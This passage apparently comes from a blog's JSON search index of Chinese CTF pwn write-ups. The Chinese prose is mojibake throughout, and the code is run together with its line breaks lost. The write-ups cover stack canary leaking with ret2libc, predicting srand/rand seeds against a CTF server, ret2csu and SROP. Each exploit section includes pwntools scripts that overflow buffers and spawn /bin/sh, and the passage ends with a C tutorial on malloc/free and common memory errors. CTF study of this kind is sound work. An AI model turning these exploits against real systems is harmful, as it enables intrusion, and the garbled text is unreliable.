0x401a1cmov_rdi_rsi = 0x401a25ret = 0x4015b0bss = 0x4040f0sys = 0x401180io.recvuntil(b&#x27;demo&#x27;)io.sendline(b&#x27;1&#x27;)io.recvuntil(b&#x27;name&#x27;)io.send(b&#x27;/bin/sh&#x27;)#gdb.attach(io)pl = b&#x27;\\x00&#x27; * 0x58 + p64(pop_rsi) + p64(bss) + p64(mov_rdi_rsi) + p64(sys) + b&#x27;\\x00&#x27; * 0x50io.recvuntil(b&#x27;yourself&#x27;) io.send(pl)                                                                        io.interactive()\n\n\n\n5.Canary\n\nå¯ä»¥çœ‹å‡ºè¿™é‡Œå¼€äº†canaryä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å†™æ³„éœ²å‡ºcanaryã€‚vulnå‡½æ•°å¯ä»¥çœ‹å‡º ï¼Œç»™äº†å¾ˆå¤šæº¢å‡ºçš„ç©ºé—´ã€‚æ‰€ä»¥å¯ä»¥å¡«å……canaryçš„æœ€é«˜ä½å­—èŠ‚ï¼Œå°±å¯ä»¥æŠŠcanaryæ³„éœ²å‡ºæ¥äº†ã€‚ç„¶ååé¢å°±å¯ä»¥æŒ‰ç…§ret2libcå»åšäº†ã€‚ä¸è¿‡è¿™é‡Œæ²¡æœ‰pop rdiï¼Œé‚£æˆ‘ä»¬åˆè¯¥æ€ä¹ˆæ³„éœ²libc_baseå‘¢ï¼Ÿ\nè¿›gdbè°ƒè¯•ï¼Œå¯ä»¥çœ‹è§ï¼Œå½“æˆ‘ä»¬è¿è¡Œåˆ°vulnå‡½æ•°retå‰ï¼Œå¯ä»¥çœ‹åˆ°rdiçš„åœ°å€å†…å­˜æ”¾ç€funlockfileçš„åœ°å€ã€‚é‚£æ­¤æ—¶è°ƒç”¨ puts_pltå°±å¯ä»¥æŠŠrdiå­˜æ”¾çš„å†…å®¹æ‰“å°å‡ºæ¥äº† ã€‚\n\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)vuln = elf.sym.vuln#gdb.attach(io)pl1 = b&#x27;a&#x27; *  0x148 + b&#x27;b&#x27;io.recvuntil(b&#x27;name &gt;&gt;&#x27;)io.send(pl1)io.recvuntil(b&#x27;ab&#x27;)canary = u64(io.recv(7).rjust(8,b&#x27;\\x00&#x27;))success(f&#x27;canary:&#x27;+hex(canary))pl2 = b&#x27;a&#x27; * (0x110-0x8) + p64(canary) + p64(0) + p64(elf.plt.puts) + p64(vuln)io.recvuntil(b&#x27;content &gt;&gt;&#x27;)#gdb.attach(io)io.send(pl2)base = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00\\x00&#x27;) - libc.sym.funlockfilesuccess(hex(base))#gdb.attach(io)sys = base + libc.sym.systembinsh = base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))rdi = base + next(libc.search(asm(&#x27;pop rdi;ret&#x27;)))ret = 0x401493pl3 = b&#x27;a&#x27;*(0x110-0x8) + p64(canary) + p64(0) + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)io.recvuntil(b&#x27;name &gt;&gt;&#x27;)#gdb.attach(io)io.sendline(b&#x27;a&#x27;)io.recvuntil(b&#x27;content &gt;&gt;&#x27;)io.send(pl3)io.interactive()\n\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"random","url":"/2025/12/16/random/","content":"randomä¹‹å‰ä¸€ç›´é‡åˆ°éšæœºæ•°çš„é¢˜ç›®ï¼Œä¸€ç›´æ²¡æœ‰å°è¯•ï¼Œç°åœ¨æ¥è®°å½•ä¸€ä¸‹æ–°çš„ä¸€ç§è§£é¢˜æ–¹æ³•ï¼Œé¡ºä¾¿åŠ å¼ºä¸€ä¸‹Pythonèƒ½åŠ›ã€‚ğŸ˜\n\nå¯ä»¥çœ‹å‡ºæ¥ï¼Œè¿™é‡ŒåŸºæœ¬ä¸Šéƒ½æ˜¯éšæœºæ•°ï¼Œä½†æ˜¯å…¶å®æ˜¯ä¼ªéšæœºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å¾—åˆ°ç§å­çš„å€¼ï¼Œæ¥è·å¾—ç¨‹åºä¸­çš„éšæœºæ•°ã€‚è¿™é‡Œæœ€ä¸»è¦çš„å…¶å®å°±æ˜¯è„šæœ¬çš„ç¼–å†™ã€‚\nç”±äºæˆ‘ä»¬è„šæœ¬æ˜¯ç”±pythonæ¥å†™çš„ï¼Œè€Œç¨‹åºä½¿ç”¨Cè¯­è¨€ã€‚æ‰€ä»¥è¿™é‡Œå¼•ç”¨ctypesåº“ã€‚\nctypes æ˜¯ Python çš„ä¸€ä¸ªå¤–éƒ¨å‡½æ•°åº“ï¼Œç”¨äºè°ƒç”¨ C è¯­è¨€çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆDLLï¼‰æˆ–å…±äº«åº“ã€‚å®ƒæä¾›äº†ä¸ C è¯­è¨€å…¼å®¹çš„æ•°æ®ç±»å‹ï¼Œå¹¶å…è®¸åœ¨ Python ä¸­ç›´æ¥è°ƒç”¨ C å‡½æ•°ã€‚\né€šè¿‡åˆ†æç¨‹åºå¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬åªè¦æ»¡è¶³v7&#x3D;&#x3D;v8å°±å¯ä»¥è·å¾—shellã€‚é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹æ€ä¹ˆå¾—åˆ°v8çš„éšæœºæ•°å‘¢ï¼Ÿ\nseed = time(0LL);srand(seed[0]);v3 = rand();v4 = rand() ^ v3;v5 = rand();srand(v4 ^ v5);rand();rand();rand();v8 = rand();\n\nå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œçš„ç§å­æ˜¯time(NULL)ï¼Œå¾—åˆ°ä¸¤ä¸ªéšæœºæ•°åï¼Œåˆé‡æ–°è®¾ç½®äº†ç§å­ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦æˆ‘ä»¬æ±‚å‡ºæ–°çš„ç§å­ï¼Œå†æ±‚å‡ºç¬¬å››ä¸ªéšæœºæ•°å°±å¯ä»¥å¾—åˆ°v8äº†ã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *import ctypescontext.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;#io = process(&#x27;./pwn&#x27;)io = remote(&#x27;node5.anna.nssctf.cn&#x27;,27416)libc = ctypes.CDLL(&#x27;libc.so.6&#x27;)io.recvuntil(b&#x27;username: &#x27;)io.send(b&#x27;a&#x27;*0x1f+b&#x27;b&#x27;)io.recvuntil(b&#x27;password: &#x27;)io.send(b&#x27;ls_4nyth1n9_7ruIy_R4nd0m?&#x27;)io.recvuntil(b&#x27;ab&#x27;)seed = u64(io.recvline()[:-1].ljust(8,b&#x27;\\x00&#x27;))success(seed)libc.srand(seed)v3 = libc.rand()v4 = libc.rand() ^ v3v5 = libc.rand()libc.srand(v4 ^ v5)libc.rand()libc.rand()libc.rand()v7 = libc.rand()io.recvuntil(b&#x27;now.\\n&#x27;)io.sendline(str(v7))io.interactive()\n\nè¿™è¾¹è§£é‡Šä¸€ä¸‹expã€‚è¿™é‡Œçš„så’Œseed[2]æ˜¯ç´§æŒ¨ç€çš„ï¼Œè€Œreadè¯»å–çš„æœ€å¤§é•¿åº¦åˆšå¥½æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯sæ‰€æœ‰çš„å­—èŠ‚å¤§å°ã€‚é‚£ä¹ˆå½“æˆ‘è¯»å…¥0x20paddingæ—¶ï¼Œä¸‹é¢çš„printfä¾¿ä¼šè¾“å‡ºï¼Œç›´åˆ°é‡åˆ°\\x00ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¼šè¯»å‡ºseed[0]ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ç¬¬ä¸€ä¸ªç§å­ï¼Œä¹Ÿå°±å¯ä»¥å¾—åˆ°æ¥ä¸‹æ¥çš„ç§å­äº†ã€‚\nctypes.CDLLæ˜¯åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥ç”¨æ¥è°ƒç”¨Cè¯­è¨€ã€‚\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"ret2csu","url":"/2025/11/21/ret2csu/","content":"ret2csuå°†é™„ä»¶ä¸¢è¿›ida\n\nå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºä¸­ä¸å­˜åœ¨ä»»ä½•åé—¨å‡½æ•°ã€‚ä½†æ˜¯é™„ä»¶åˆç»™äº†libc.so.6ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡writeå‡½æ•°ï¼Œå°†writeæˆ–è€…readçš„åœ°å€è¿›è¡Œæ³„éœ²ï¼Œä»è€Œè¾¾åˆ°ret2libcçš„åšæ³•ã€‚\näºæ˜¯æˆ‘ä»¬éœ€è¦æ§åˆ¶writeçš„æ‰§è¡Œæµã€‚å¯ä»¥çœ‹å‡ºwriteæœ‰ä¸‰ä¸ªå‚æ•°ï¼šfdï¼Œbufï¼Œlenã€‚åœ¨x86-64æ¶æ„ä¸‹ï¼Œå‰å…­ä¸ªå‚æ•°ä¾æ¬¡å­˜åœ¨rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦åšåˆ°rsi &#x3D; 1ï¼›rdi &#x3D; write_gotï¼›len&gt;&#x3D;8å°±å¯ä»¥äº†ã€‚\n__libc_csu_initè¿›è¡Œåˆå§‹åŒ–æ—¶æœ‰è¿™ä¹ˆä¸€ä¸²æ±‡ç¼–æŒ‡ä»¤ï¼š\n\nå¦‚æœæˆ‘ä»¬æŠŠä¸ŠåŠéƒ¨åˆ†æˆä¸ºgadget2ï¼Œä¸‹åŠéƒ¨åˆ†gadget1ã€‚é‚£ä¹ˆåœ¨gadget1ä¸­å¯ä»¥çœ‹å‡ºæˆ‘ä»¬å¯ä»¥è½»æ¾æ§åˆ¶popåˆ°å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œå†ç»“åˆgadget2ï¼Œå¯ä»¥çœ‹å‡ºæ§åˆ¶r12é—´æ¥æ§åˆ¶rdiâ€“fdï¼ˆè¿™é‡Œr12dæ˜¯æŒ‡å–rdiçš„ä½å››å­—èŠ‚çš„å€¼ï¼Œå› ä¸ºæ˜¯æ§åˆ¶fdæ‰€ä»¥ä¸å½±å“ï¼‰ï¼›æ§åˆ¶r13é—´æ¥æ§åˆ¶rsiâ€“write_gotï¼›æ§åˆ¶r14é—´æ¥æ§åˆ¶rdxâ€“lenã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨vulnä¸­è¿›è¡Œæ ˆæº¢å‡ºï¼Œæ§åˆ¶ç¨‹åºæ‰§è¡Œåˆ°gadget1çš„ä½ç½®ï¼Œç„¶åç²¾å¿ƒæ„é€ å„ä¸ªå¯„å­˜å™¨çš„å€¼ï¼Œè¿›è¡Œæˆ‘ä»¬éœ€è¦çš„å……æ»¡ç‰¹å®šå‚æ•°çš„å‡½æ•°ã€‚\n\nå¯ä»¥çœ‹åˆ°expä¸­è¿˜æ§åˆ¶äº†rbxå’Œrbpçš„å€¼ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\n\nåé¢å°±æ˜¯å’Œret2libcä¸€æ ·çš„åšæ³•äº†ï¼Œå°±ä¸å¤šèµ˜è¿°äº†ã€‚\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"ret2srop","url":"/2025/12/15/ret2srop/","content":"ret2sropciscn_2019_s_3sropåœ¨wikié‡Œå½’ç±»ä¸ºé«˜é˜¶ropã€‚\né¦–å…ˆéœ€è¦äº†è§£ä»€ä¹ˆæ˜¯sropã€‚\nsigreturnæ˜¯ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œåœ¨ç±» unix ç³»ç»Ÿå‘ç”Ÿ signal çš„æ—¶å€™ä¼šè¢«é—´æ¥åœ°è°ƒç”¨ã€‚\nsignal æœºåˆ¶signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n\n\nå†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚\nå†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ sigreturn çš„ç³»ç»Ÿè°ƒç”¨åœ°å€ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° ucontext ä»¥åŠ siginfo è¿™ä¸€æ®µä¸º Signal Frameã€‚**éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚**ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ sigreturn ä»£ç ã€‚\nsignal handler è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ sigreturn çš„è°ƒç”¨å·ä¸º 119(0x77)ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15(0xf)ã€‚\n\nè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†ï¼Œç»™å‡ºé“¾æ¥ã€‚\nSROP - CTF Wiki\n\nå¯ä»¥çœ‹å‡ºï¼Œè¿™é‡Œç³»ç»Ÿè°ƒç”¨readå’Œwriteå‡½æ•°ã€‚åŒæ—¶0xfæ˜¯sigreturnçš„è°ƒç”¨å·ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•sropã€‚\nä¸‹é¢ç»™å‡ºexpã€‚\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;io = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)pl1 = b&#x27;a&#x27;*0x10 + p64(elf.sym.vuln)#è¿™é‡Œä¸æ˜¯0x18çš„åŸå› æ˜¯ï¼Œæ±‡ç¼–ä¸­ç›´æ¥retï¼Œè€Œæ²¡æœ‰leaveï¼Œæ‰€ä»¥ç›´æ¥å†™å…¥vulnåœ°å€å°±è¡Œäº†#gdb.attach(io)io.send(pl1)stack = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:]+b&#x27;\\x00\\x00&#x27;)success(hex(stack))rsp = stack -  0x118gadget = 0x4004da #mov rax,0xfsyscall_ret = 0x400517sigFrame = SigreturnFrame() sigFrame.rax =59sigFrame.rdi = rspsigFrame.rsi = 0sigFrame.rdx = 0sigFrame.rip = syscall_retpl2 = b&#x27;/bin/sh\\x00&#x27;.ljust(0x10,b&#x27;a&#x27;) + p64(gadget) + p64(syscall_ret) + bytes(sigFrame)io.send(pl2)io.interactive()\n\nè§£é‡Šä¸€ä¸‹expã€‚\nè¿™é‡Œå› ä¸ºè°ƒç”¨äº†writeå‡½æ•°ï¼Œè€Œä¸”å†™å‡ºçš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä½ç½®çš„åœ°å€ã€‚è¿›å…¥gdbåŠ¨è°ƒçœ‹ä¸‹writeä¼šå†™å‡ºä»€ä¹ˆã€‚\n\nå¯ä»¥çœ‹å‡ºï¼Œåœ¨0x7fffffffde60çš„ä½ç½®ï¼Œæ”¾ç€æ ˆä¸Šçš„åœ°å€ã€‚ï¼ˆ0x7fffffffde50ä¸Šå­˜æ”¾çš„åœ°å€ä¼šè¢«æˆ‘ä»¬å¡«å……çš„æ•°æ®è¦†ç›–ï¼Œæ‰€ä»¥é€‰æ‹©æ¥å—de60å¤„çš„ã€‚ï¼‰ç”±äºASLRæœºåˆ¶çš„å­˜åœ¨ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•å¾—å‡ºå‡†ç¡®çš„åœ°å€ï¼Œä½†æ˜¯åç§»é‡æ˜¯ä¸å˜çš„ã€‚æ‰€ä»¥æ­¤æ—¶çš„åç§»å°±æ˜¯distance 0x00007fffffffdf58 0x7fffffffde40 ; offset &#x3D; 0x118ã€‚ï¼ˆè¿™é‡Œå»ºè®®æ¢ä¸‹ç¯å¢ƒï¼Œä¸ç„¶åç§»å¯èƒ½ä¸åŒã€‚ç”±äºç‰ˆæœ¬æ˜¯ubuntu18ï¼Œæ‰€ä»¥è¿™é‡Œç”¨çš„æ˜¯  libc-2.27.so   2.27-3ubuntu1_amd64ï¼‰\næ‰€ä»¥æˆ‘ä»¬å†™å…¥çš„åœ°å€å°±æ˜¯æˆ‘ä»¬æ¥æ”¶çš„çš„åœ°å€å†å‡å»0x118ã€‚åé¢å°±æ˜¯sropçš„ä¹¦å†™æ ¼å¼\nsigFrame = SigreturnFrame() sigFrame.rax =59 #è®¾ç½®raxçš„å€¼ä¸º59ï¼Œæ˜¯execveçš„ç³»ç»Ÿè°ƒç”¨å·sigFrame.rdi = rsp #è¿™é‡Œæ˜¯å°†æˆ‘ä»¬å†™å…¥çš„æ ˆåœ°å€ä½œä¸ºä¸€å‚ä¼ å…¥sigFrame.rsi = 0sigFrame.rdx = 0 #execve(&quot;/bin/sh&quot;,0,0)sigFrame.rip = syscall_ret #è°ƒç”¨sigFrame\n\n","categories":["stack"],"tags":["pwnå…¥é—¨"]},{"title":"åŠ¨æ€å†…å­˜åˆ†é…","url":"/2025/12/19/%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D/","content":"1.mallocvoid* malloc (size_t size);\n\nå‘å†…å­˜ç”³è¯·ä¸€å—è¿ç»­å¯ç”¨çš„ç©ºé—´ï¼Œå¹¶è¿”å›æŒ‡å‘è¿™å—ç©ºé—´çš„æŒ‡é’ˆã€‚\nå¦‚æœè¿”å›æˆåŠŸï¼Œåˆ™è¿”å›ä¸€ä¸ªæŒ‡å‘å¼€è¾Ÿå¥½ç©ºé—´çš„æŒ‡é’ˆã€‚\nå¦‚æœå¼€è¾Ÿå¤±è´¥ï¼Œåˆ™è¿”å›ä¸€ä¸ªNULLæŒ‡é’ˆï¼Œå› æ­¤mallocçš„è¿”å›å€¼ä¸€å®šè¦åšæ£€æŸ¥ã€‚\nè¿”å›å€¼çš„ç±»å‹æ˜¯void*ï¼Œæ‰€ä»¥mallocå‡½æ•°å¹¶ä¸çŸ¥é“å¼€è¾Ÿç©ºé—´çš„ç±»å‹ï¼Œå…·ä½“ä½¿ç”¨æƒ…å†µç”±ä½¿ç”¨è€…å†³å®šã€‚\nå¦‚æœå‚æ•°sizeä¸º0ï¼Œmallocçš„è¡Œä¸ºæ˜¯æ ‡å‡†æ˜¯æœªå®šä¹‰çš„ï¼Œå–å†³äºç¼–è¯‘å™¨ã€‚\n#include &lt;stdlib.h&gt;int main()&#123;    int* p = (int*)malloc(20);//ç”±äºmallocçš„è¿”å›å€¼æ˜¯void*ï¼Œæ‰€ä»¥è¿™é‡Œå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¸ºæˆ‘ä»¬æ‰€éœ€è¦çš„ã€‚    if(p == NULL)    &#123;        perror(&quot;malloc&quot;);//ç”¨äºé”™è¯¯å¤„ç†çš„åº“å‡½æ•°        return 1;    &#125;    //ä½¿ç”¨ç©ºé—´    int i = 0;    for(i = 0; i &lt; 5; i++)    &#123;        *(p + i) = i + 1;    &#125;    return 0;&#125;\n\n\n\n2.freevoid free (void* ptr);\n\nä¸“é—¨ç”¨æ¥åšåŠ¨æ€å†…å­˜çš„é‡Šæ”¾å’Œå›æ”¶ã€‚\nå¦‚æœå‚æ•°ptræŒ‡å‘çš„ç©ºé—´ä¸æ˜¯åŠ¨æ€å¼€è¾Ÿçš„ï¼Œé‚£freeå‡½æ•°çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚\nå¦‚æœptræ˜¯NULLæŒ‡é’ˆï¼Œåˆ™å‡½æ•°ä»€ä¹ˆäº‹éƒ½ä¸åšã€‚\nfree(p);//ä¼ é€’çš„æ˜¯è¦é‡Šæ”¾å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€ã€‚é‡Šæ”¾å®ŒpæŒ‡é’ˆåï¼Œpä¸ºé‡æŒ‡é’ˆã€‚p = NULL;//é¿å…æˆä¸ºé‡æŒ‡é’ˆã€‚\n\n\n\n3.callocvoid* calloc (size_t num, size_t size);\n\nå‡½æ•°çš„åŠŸèƒ½æ˜¯numä¸ªå¤§å°ä¸ºsizeçš„å…ƒç´ å¼€è¾Ÿä¸€å—ç©ºé—´ï¼Œå¹¶ä¸”æŠŠç©ºé—´çš„å†…ä¸ªå­—èŠ‚åˆå§‹åŒ–ä¸º0ã€‚\nä¸å‡½æ•°mallocçš„åŒºåˆ«åœ¨äºcallocä¼šåœ¨è¿”å›åœ°å€ä¹‹å‰æŠŠç”³è¯·çš„ç©ºé—´çš„æ¯ä¸ªå­—èŠ‚åˆå§‹åŒ–ä¸ºå…¨0ã€‚\n#include &lt;stdlib.h&gt;int* p = (int*)calloc(5, sizeof(int));\n\n\n\n4.reallocvoid* realloc (void* ptr, size_t size)\n\nreallocå‡½æ•°çš„å‡ºç°è®©åŠ¨æ€å†…å­˜ç®¡ç†æ›´åŠ çµæ´»ã€‚\nä¸ºäº†åˆç†çš„ä½¿ç”¨å†…å­˜ï¼Œæˆ‘ä»¬å¯¹å†…å­˜çš„å¤§å°åšçµæ´»çš„è°ƒæ•´ã€‚é‚£reallocå‡½æ•°å°±å¯ä»¥åšåˆ°å¯¹åŠ¨æ€å¼€è¾Ÿå†…å­˜å¤§å°çš„è°ƒæ•´ã€‚\nptræ˜¯è¦è°ƒæ•´çš„å†…å­˜åœ°å€ã€‚\nsizeè°ƒæ•´ä¹‹åæ–°çš„å¤§å°ã€‚\nè¿”å›å€¼ä¸ºè°ƒæ•´ä¹‹åçš„å†…å­˜èµ·å§‹ä½ç½®ã€‚\nå¦‚æœè°ƒæ•´å¤±è´¥ï¼Œè¿”å›çš„æ˜¯ç©ºæŒ‡é’ˆNULLã€‚\nè¿™ä¸ªå‡½æ•°å†è°ƒæ•´åŸå†…å­˜ç©ºé—´å¤§å°çš„åŸºç¡€ä¸Šï¼Œè¿˜ä¼šå°†åŸæ¥å†…å­˜ä¸­çš„æ•°æ®ç§»åŠ¨åˆ°æ–°çš„ç©ºé—´ã€‚\n#include &lt;stdlib.h&gt;realloc(p,40)ï¼›\n\n\nåœ¨æƒ…å†µ2ä¸‹ï¼š\n1.åœ¨å †åŒºçš„å†…å­˜ä¸­æ‰¾ä¸€ä¸ªæ–°çš„ç©ºé—´ï¼Œå¹¶ä¸”æ»¡è¶³æ–°çš„å¤§å°è¦æ±‚\n2.ä¼šå°†åŸæ¥ç©ºé—´çš„æ•°æ®æ‹·è´ä¸€ä»½åˆ°æ–°çš„ç©ºé—´ã€‚\n3.é‡Šæ”¾æ—§çš„ç©ºé—´ã€‚\n4.è¿”å›æ–°çš„å†…å­˜ç©ºé—´çš„èµ·å§‹åœ°å€ã€‚\nrealloc(NULL,20) = malloc(20)\n\n\n\n5.å¸¸è§çš„åŠ¨æ€å†…å­˜çš„é”™è¯¯5.1å¯¹NULLæŒ‡é’ˆçš„è§£å¼•ç”¨æ“ä½œint main()&#123;    int* p = (int*)malloc(20);    *p = 20;//ä¸ºå¯¹è¿”å›å€¼ç»è¡Œåˆ¤æ–­æ˜¯å¦ä¸ºNULLã€‚    return 0;&#125;\n\n\n\n5.2å¯¹åŠ¨æ€å¼€è¾Ÿç©ºé—´çš„è¶Šç•Œè®¿é—®void test()&#123;    int i = 0;    int* p = (int*)malloc(10*sizeof(int));    if(p==NULL)    &#123;        exit(EXIT_FAILURE);    &#125;    for(i=0;i&lt;=10;i++)    &#123;        *(p+i) = i;//å½“iæ˜¯10çš„æ—¶å€™å°±è¶Šç•Œè®¿é—®ã€‚    &#125;    free(p);    p = NULL;&#125;int main()&#123;    test();    return 0;&#125;\n\n\n\n5.3å¯¹éåŠ¨æ€å¼€è¾Ÿçš„å†…å­˜ä½¿ç”¨freeé‡Šæ”¾int main()&#123;    int a = 10;//å±€éƒ¨å˜é‡ï¼Œåœ¨æ ˆä¸Šã€‚    int* p = &amp;a;    free(p);    p = NULL;    return 0;&#125;\n\n\n\n5.4ä½¿ç”¨freeé‡Šæ”¾ä¸€å—åŠ¨æ€å¼€è¾Ÿå†…å­˜çš„ä¸€éƒ¨åˆ†int main()&#123;    int* p = (int*)malloc(100);    if(p==NULL)    &#123;        return 1;    &#125;    int i = 0;    for(i=0;i&lt;5;i++)    &#123;        *p = i+1;        p++;    &#125;    free(p);//æ­¤æ—¶pæŒ‡å‘çš„ä½ç½®ä¸æ˜¯åŠ¨æ€å¼€è¾Ÿç©ºé—´çš„èµ·å§‹åœ°å€ã€‚    p = NULL;    return 0;&#125;\n\n\n\n5.5å¯¹åŒä¸€å—åŠ¨æ€å†…å­˜å¤šæ¬¡é‡Šæ”¾void test()&#123;    int* p = (int*)malloc(100);    free(p);//è®°å¾—è¦p = NULL;    free(p);//é‡å¤é‡Šæ”¾&#125;int main()&#123;    test();    return 0;&#125;\n\n\n\n5.6åŠ¨æ€å¼€è¾Ÿå†…å­˜å¿˜è®°é‡Šæ”¾ ï¼ˆå†…å­˜æ³„æ¼ï¼‰void test()&#123;    int* p = (int*)malloc(100);    if(p != NULL)    &#123;        *p = 20;    &#125;&#125;int main()&#123;    test();    while(1);    return 0;&#125;\n\nå¦‚æœæ²¡æœ‰ä½¿ç”¨freeæ¥é‡Šæ”¾ï¼Œå½“ç¨‹åºè¿è¡Œç»“æŸçš„æ—¶å€™ï¼Œä¹Ÿä¼šç”±æ“ä½œç³»ç»Ÿå›æ”¶çš„ï¼\nå°½é‡è¦åšåˆ°ï¼š\n1.è°ï¼ˆå‡½æ•°ç­‰ï¼‰ç”³è¯·çš„ç©ºé—´è°é‡Šæ”¾ã€‚ï¼ˆmallocå’Œfreeè¦æˆå¯¹å‡ºç°ï¼‰\n2.å¦‚æœä¸èƒ½é‡Šæ”¾ï¼Œè¦å‘Šè¯‰ä½¿ç”¨çš„äººï¼Œè®°å¾—é‡Šæ”¾ã€‚\n","categories":["heap"],"tags":["Cè¯­è¨€"]}]